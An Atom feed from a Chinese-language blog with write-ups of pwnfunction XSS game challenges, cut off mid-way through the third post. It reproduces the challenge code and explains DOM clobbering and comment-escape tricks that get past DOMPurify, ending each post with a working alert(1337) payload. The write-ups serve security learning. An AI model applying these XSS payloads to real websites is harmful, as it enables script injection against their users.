<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>retanoj&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://retanoj.github.io/"/>
  <updated>2020-04-20T14:12:15.496Z</updated>
  <id>http://retanoj.github.io/</id>
  
  <author>
    <name>retanoj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS game of pwnfunction - Challenges &#39;Me and the Bois&#39;</title>
    <link href="http://retanoj.github.io/2020/04/20/%E9%A2%98%E7%9B%AE-XSS-2020-04-20-XSS-game-of-pwnfunction-Challenges-Me-and-the-Bois/"/>
    <id>http://retanoj.github.io/2020/04/20/题目-XSS-2020-04-20-XSS-game-of-pwnfunction-Challenges-Me-and-the-Bois/</id>
    <published>2020-04-20T13:47:50.000Z</published>
    <updated>2020-04-20T14:12:15.496Z</updated>
    
    <content type="html"><![CDATA[<p>Challenges板块Medium难度的题目 <a href="https://xss.pwnfunction.com/challenges/me-and-the-bois/" target="_blank" rel="noopener">Me and the Bois</a>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"bois"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Variables */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> safeTags = [<span class="string">'a'</span>, <span class="string">'area'</span>, <span class="string">'b'</span>, <span class="string">'br'</span>, <span class="string">'col'</span>, <span class="string">'code'</span>, <span class="string">'div'</span>, <span class="string">'em'</span>, <span class="string">'hr'</span>, <span class="string">'h1'</span>, <span class="string">'h2'</span>, <span class="string">'h3'</span>, <span class="string">'h4'</span>, <span class="string">'h5'</span>, <span class="string">'h6'</span>, <span class="string">'i'</span>, <span class="string">'iframe'</span>, <span class="string">'img'</span>, <span class="string">'li'</span>, <span class="string">'ol'</span>, <span class="string">'p'</span>, <span class="string">'pre'</span>, <span class="string">'s'</span>, <span class="string">'small'</span>, <span class="string">'span'</span>, <span class="string">'sub'</span>, <span class="string">'sup'</span>, <span class="string">'strong'</span>, <span class="string">'u'</span>, <span class="string">'ul'</span>]</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> forbiddenAttrs = [<span class="string">'style'</span>, <span class="string">'srcdoc'</span>]</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> cssSafe = <span class="regexp">/[^a-zA-Z0-9\s\-\,\:\_\(\)\&#123;\&#125;\"\'\.\#\;\%]/g</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Inputs */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> boi = <span class="string">`&lt;h1&gt;<span class="subst">$&#123;(<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'boi'</span>)) || <span class="string">'Neo'</span>&#125;</span>&lt;/h1&gt;`</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> clean = DOMPurify.sanitize(boi, &#123; <span class="attr">ALLOWED_TAGS</span>: safeTags, <span class="attr">FORBID_ATTR</span>: forbiddenAttrs &#125;)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> bois = <span class="built_in">document</span>.getElementById(<span class="string">'bois'</span>)</span></span><br><span class="line">    bois.innerHTML += clean;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Custom Style JSON */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> custom = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'custom'</span>)) || <span class="string">""</span></span></span><br><span class="line"><span class="javascript">    custom = custom.replace(cssSafe, <span class="string">''</span>)</span></span><br><span class="line">    if (custom) &#123;</span><br><span class="line"><span class="javascript">        customStyles = <span class="built_in">JSON</span>.parse(custom)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> comment = <span class="built_in">document</span>.createComment(customStyles)</span></span><br><span class="line">        bois.appendChild(comment)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Configuration */</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.CONFIG = &#123;</span></span><br><span class="line"><span class="javascript">        color: <span class="string">"lime"</span>,</span></span><br><span class="line"><span class="javascript">        backgroundColor: <span class="string">"#000"</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Generic Style Setter */</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">styleSetter</span>(<span class="params">styles, execStr</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> style <span class="keyword">in</span> styles) &#123;</span></span><br><span class="line">            if (styles.hasOwnProperty(style)) &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">eval</span>(execStr)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Default Styles */</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.DEFAULTS = &#123;</span></span><br><span class="line"><span class="javascript">        borderRadius: <span class="string">"5px"</span>,</span></span><br><span class="line"><span class="javascript">        fontFamily: <span class="string">"Space Mono"</span>,</span></span><br><span class="line"><span class="javascript">        fontWeight: <span class="string">"700"</span>,</span></span><br><span class="line"><span class="javascript">        letterSpacing: <span class="string">"4px"</span>,</span></span><br><span class="line"><span class="javascript">        padding: <span class="string">"20px"</span>,</span></span><br><span class="line"><span class="javascript">        textAlign: <span class="string">"center"</span>,</span></span><br><span class="line"><span class="javascript">        width: <span class="string">"500px"</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    styleSetter(DEFAULTS, <span class="string">`CONFIG[style] = styles[style]`</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Custom Styles */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>.customStyles) &#123;</span></span><br><span class="line"><span class="javascript">        styleSetter(customStyles, <span class="string">`CONFIG[style] = customStyles[style]`</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Stylise! */</span></span></span><br><span class="line"><span class="javascript">    styleSetter(CONFIG, <span class="string">`bois.firstElementChild.style[style] = CONFIG[style]`</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>又是个大篇幅JS的题目。有了前一题的经验，这个题思考起来会快一点。</p><p>boi参数经过DOMPurify被放到了innerHTML就结束了，不考虑mXSS了，只能是DOM Clobbering。</p><p>看到末尾一句，竟然会想到4级的clobber，写个innerHTML进去。看到<code>forbiddenAttrs</code>里有srcdoc，也就只能算了。</p><p>上一题用到了JS报错和clobber，这个题目也需要用到这两个技巧。</p><p>在<code>JSON.parse</code>和<code>document.createComment</code>那个地方可以造成一个JS报错，从而在第二段JS块clobber<code>CONFIG</code>变量。需要思考的是在哪里报错，以及需要把<code>CONFIG</code>clobber成什么才有用。</p><p>对于报错，不能在<code>JSON.parse</code>一句，而只能在<code>document.createComment</code>，因为我们需要<code>customStyles</code>在后面起作用。而<code>createComment</code>的时候，一定会调用JS对象的<code>toString</code>方法，所以JSON里面需要有个<code>{&quot;toString&quot;:0}</code>来造报错。</p><p>看到<code>styleSetter(customStyles, `CONFIG[style] = customStyles[style]`)</code>一句，可以在customStyles里写<code>{&quot;innerHTML&quot;: &quot;&lt;img/src=x onerror=alert(1337)&gt;&quot;}</code>，从而触发XSS。但是<code>cssSafe</code>变量限制太大，编码都不能用，就此作罢。</p><p>而细看一下<code>safeTags</code>允许的标签里居然有iframe，那么customStyles里就可以用<code>{&quot;src&quot;:&quot;javascript:alert(1337)&quot;}</code>了。</p><p>因此，用iframe去clobber <code>CONFIG</code>，在利用customStyles来对其src属性进行赋值，从而造成XSS。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: boi=&lt;iframe src=x id=CONFIG&gt;&amp;custom=&#123;&quot;src&quot;:&quot;javascript:alert(1337)&quot;,&quot;toString&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>:} done.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Challenges板块Medium难度的题目 &lt;a href=&quot;https://xss.pwnfunction.com/challenges/me-and-the-bois/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Me and the Bois&lt;
      
    
    </summary>
    
      <category term="XSS" scheme="http://retanoj.github.io/categories/XSS/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
      <category term="XSS" scheme="http://retanoj.github.io/tags/XSS/"/>
    
      <category term="pwnfunction" scheme="http://retanoj.github.io/tags/pwnfunction/"/>
    
  </entry>
  
  <entry>
    <title>XSS game of pwnfunction - Challenges &#39;Jason Bourne&#39;</title>
    <link href="http://retanoj.github.io/2020/04/19/%E9%A2%98%E7%9B%AE-XSS-2020-04-19-XSS-game-of-pwnfunction-Challenges-Jason-Bourne/"/>
    <id>http://retanoj.github.io/2020/04/19/题目-XSS-2020-04-19-XSS-game-of-pwnfunction-Challenges-Jason-Bourne/</id>
    <published>2020-04-19T09:14:06.000Z</published>
    <updated>2020-04-19T09:41:43.859Z</updated>
    
    <content type="html"><![CDATA[<p>Challenges板块Medium难度的题目 <a href="https://xss.pwnfunction.com/challenges/bourne/" target="_blank" rel="noopener">Jason Bourne</a>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Helpers */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> bootstrapAlert = <span class="function">(<span class="params">msg, type</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> (<span class="string">`&lt;div class="alert alert-<span class="subst">$&#123;type&#125;</span>" role="alert"&gt;<span class="subst">$&#123;DOMPurify.sanitize(msg)&#125;</span>&lt;/div&gt;`</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getAlert = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">document</span>.getElementById(<span class="string">'alerts'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Welcome */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> name = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'name'</span>)) || <span class="string">"Pamela Landy"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(</span></span><br><span class="line"><span class="xml">        bootstrapAlert(`<span class="tag">&lt;<span class="name">b</span>&gt;</span>Operation Treadstone<span class="tag">&lt;/<span class="name">b</span>&gt;</span>: Welcome <span class="tag">&lt;<span class="name">u</span>&gt;</span>$&#123;name&#125;<span class="tag">&lt;/<span class="name">u</span>&gt;</span>.`, 'info')</span></span><br><span class="line">    )</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- alerts --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"alerts"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Handle to `#alert` */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> alerts = <span class="built_in">document</span>.getAlert();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Treadstone Credentials */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> identification = <span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> code = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">89999</span> + <span class="number">10000</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Default Credentials */</span></span></span><br><span class="line">    DEFAULTS = &#123;&#125;;</span><br><span class="line">    DEFAULTS[identification] = code;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Optional Comment */</span></span></span><br><span class="line">    if (location.hash) &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> comment = <span class="built_in">document</span>.createComment(<span class="built_in">decodeURI</span>(location.hash).slice(<span class="number">1</span>));</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.querySelector(<span class="string">'#alerts'</span>).appendChild(comment);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Use `DEFAULTS` to init `SECRETS` */</span></span></span><br><span class="line">    SECRETS = DEFAULTS</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Increment the `code` before the check */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> secretKey = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'key'</span>) || <span class="string">"TREADSTONE_WEBB"</span>;</span></span><br><span class="line">    SECRETS[secretKey] += 1;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Authorization Check */</span></span></span><br><span class="line">    if (SECRETS[secretKey] === SECRETS[identification]) &#123;</span><br><span class="line"><span class="javascript">        confirm(<span class="string">`Jesus Christ, it's Jason Bourne!`</span>)</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        confirm(<span class="string">`You ain't David Webb!`</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>挺有意思的一个题目，题目内极少出现HTML，反而是大片的<code>&lt;script&gt;</code>。</p><p>pwnfunction上的题目，要么mXSS，要么使用DOM Clobbering技巧。这题目里见到DOMPurify，输出点做突变没有太大意义，考虑DOM Clobbering吧。</p><p><code>location.hash</code>经过了<code>createComment</code>写进了<code>#alerts</code>中。利用DOM Clobbering可以做到将这段comment写入用户控制的一个元素内。</p><p>网上查了一圈，<code>createComment</code>造成XSS需要三步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. var comment = document.createComment(&apos;--&gt;&lt;img src=0 onerror=alert(1)&gt;&apos;) // 制造逃逸字符串</span><br><span class="line">2. ele.appendChild(comment) // 将comment放置到一个element下</span><br><span class="line">3. ele.innerHTML += &quot;xxx&quot; // 重渲染，触发</span><br></pre></td></tr></table></figure><p>目前，步骤1和2很容易实现，步骤3怎么办？</p><p>对于步骤3，仅仅看到一行类似的语句<code>SECRETS[secretKey] += 1;</code>，而<code>secretKey</code>又是用户可控的。那么，如果能让<code>SECRETS</code>指向包裹着comment的元素，不就可以了嘛。</p><p><code>SECRETS</code>由<code>DEFAULTS</code>赋值而来，而<code>DEFAULTS</code>来自于另一段JS代码块，看起来DEFAULTS是用户不可控的。</p><p>一开始没想明白，为什么这两段JS代码要分开写？而且，有一句非常孤立的语句没有被使用到。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> alerts = <span class="built_in">document</span>.getAlert();</span><br></pre></td></tr></table></figure><p>如何做到DEFAULTS可控呢？一个是DOM Clobbering技巧，另一个是第三段代码块失效。</p><p>前者好办，如何让第三段代码块失效？好像可以造报错，一个JS代码块报错仅影响当前块之后的内容不执行，而不会影响其他JS代码块。这里刚好可以用上面那句孤立的语句来造成一个JS报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = &lt;form id=alerts&gt;#--&gt;&lt;img src=0 onerror=alert(1)&gt; // 可以完成createComment XSS 1和2</span><br><span class="line">name = &lt;img name=getAlert&gt; // 造成 document.getAlert()报错，影响DEFAULTS的赋值</span><br><span class="line">name = &lt;form name=DEFAULTS&gt; &amp; key = innerHTML // 可以在末段JS营造createComment XSS环境3</span><br></pre></td></tr></table></figure><p>把上面的利用连起来就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: name=&lt;img name=getAlert&gt;&lt;form id=alerts name=DEFAULTS&gt;&amp;key=innerHTML#--&gt;&lt;img src=0 onerror=alert(1337)&gt;</span><br></pre></td></tr></table></figure><p>:} done.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Challenges板块Medium难度的题目 &lt;a href=&quot;https://xss.pwnfunction.com/challenges/bourne/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Jason Bourne&lt;/a&gt;。&lt;/p&gt;
&lt;fi
      
    
    </summary>
    
      <category term="XSS" scheme="http://retanoj.github.io/categories/XSS/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
      <category term="XSS" scheme="http://retanoj.github.io/tags/XSS/"/>
    
      <category term="pwnfunction" scheme="http://retanoj.github.io/tags/pwnfunction/"/>
    
  </entry>
  
  <entry>
    <title>XSS game of pwnfunction - Challenges &#39;WW3&#39;</title>
    <link href="http://retanoj.github.io/2020/04/18/%E9%A2%98%E7%9B%AE-XSS-2020-04-18-XSS-game-of-pwnfunction-Challenges-WW3/"/>
    <id>http://retanoj.github.io/2020/04/18/题目-XSS-2020-04-18-XSS-game-of-pwnfunction-Challenges-WW3/</id>
    <published>2020-04-18T05:24:03.000Z</published>
    <updated>2020-04-18T10:02:15.784Z</updated>
    
    <content type="html"><![CDATA[<p>Challenges板块Hard难度的题目 <a href="https://xss.pwnfunction.com/challenges/ww3/" target="_blank" rel="noopener">WW3</a>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>Meme Code<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"meme-code"</span> <span class="attr">rows</span>=<span class="string">"4"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"notify"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Utils */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> <span class="built_in">escape</span> = <span class="function">(<span class="params">dirty</span>) =&gt;</span> <span class="built_in">unescape</span>(dirty).replace(<span class="regexp">/[&lt;&gt;'"=]/g</span>, <span class="string">''</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> memeTemplate = <span class="function">(<span class="params">img, text</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> (<span class="string">`&lt;style&gt;@import url('https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap');`</span>+</span></span><br><span class="line"><span class="javascript">            <span class="string">`.meme-card&#123;margin:0 auto;width:300px&#125;.meme-card&gt;img&#123;width:300px&#125;`</span>+</span></span><br><span class="line"><span class="javascript">            <span class="string">`.meme-card&gt;h1&#123;text-align:center;color:#fff;background:black;margin-top:-5px;`</span>+</span></span><br><span class="line"><span class="javascript">            <span class="string">`position:relative;font-family:Oswald,sans-serif;font-weight:700&#125;&lt;/style&gt;`</span>+</span></span><br><span class="line"><span class="xml">            `<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"meme-card"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"$&#123;img&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>$&#123;text&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>`)</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> memeGen = <span class="function">(<span class="params">that, notify</span>) =&gt;</span> &#123;</span></span><br><span class="line">        if (text &amp;&amp; img) &#123;</span><br><span class="line">            template = memeTemplate(img, text)</span><br><span class="line"></span><br><span class="line">            if (notify) &#123;</span><br><span class="line"><span class="xml">                html = (`<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-warning"</span> <span class="attr">role</span>=<span class="string">"alert"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Meme<span class="tag">&lt;/<span class="name">b</span>&gt;</span> created from $&#123;DOMPurify.sanitize(text)&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>`)</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            setTimeout(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">'#status'</span>).remove()</span></span><br><span class="line"><span class="javascript">                notify ? ($(<span class="string">'#notify'</span>).html(html)) : <span class="string">''</span></span></span><br><span class="line"><span class="javascript">                $(<span class="string">'#meme-code'</span>).text(template)</span></span><br><span class="line">            &#125;, 1000)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Main */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> notify = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> text = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'text'</span>)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> img = <span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'img'</span>)</span></span><br><span class="line">    if (text &amp;&amp; img) &#123;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(</span></span><br><span class="line"><span class="xml">            `<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-primary"</span> <span class="attr">role</span>=<span class="string">"alert"</span> <span class="attr">id</span>=<span class="string">"status"</span>&gt;</span>`+</span></span><br><span class="line"><span class="xml">            `<span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"circle"</span> <span class="attr">src</span>=<span class="string">"$&#123;escape(img)&#125;"</span> <span class="attr">onload</span>=<span class="string">"memeGen(this, notify)"</span>&gt;</span>`+</span></span><br><span class="line"><span class="javascript">            <span class="string">`Creating meme... (<span class="subst">$&#123;DOMPurify.sanitize(text)&#125;</span>)&lt;/div&gt;`</span></span></span><br><span class="line">        )</span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#meme-code'</span>).text(memeTemplate(<span class="string">'https://i.imgur.com/PdbDexI.jpg'</span>, <span class="string">'When you get that WW3 draft letter'</span>))</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>说来很巧，早上看到Chrome推的新闻<a href="https://www.infoq.com/news/2020/04/jquery-35-xss-vulnerability-fix/" target="_blank" rel="noopener"><em>jQuery 3.5 Released, Fixes XSS Vulnerability</em></a>，说作者发现jQuery &lt; 3.5的<code>.html()</code>方法突变会造成XSS，还出了个题目来解释这个问题，刚好就是WW3这个题目。</p><p>大致是说<code>.html()</code>方法会调用<code>htmlPrefilter()</code>，其用正则对XHTML样的内容进行替换，使内容满足HTML要求，源码见<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202" target="_blank" rel="noopener">htmlPrefilter()</a>。然而<code>.html()</code>的表现和<code>innerHTML</code>的表现不太一致。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 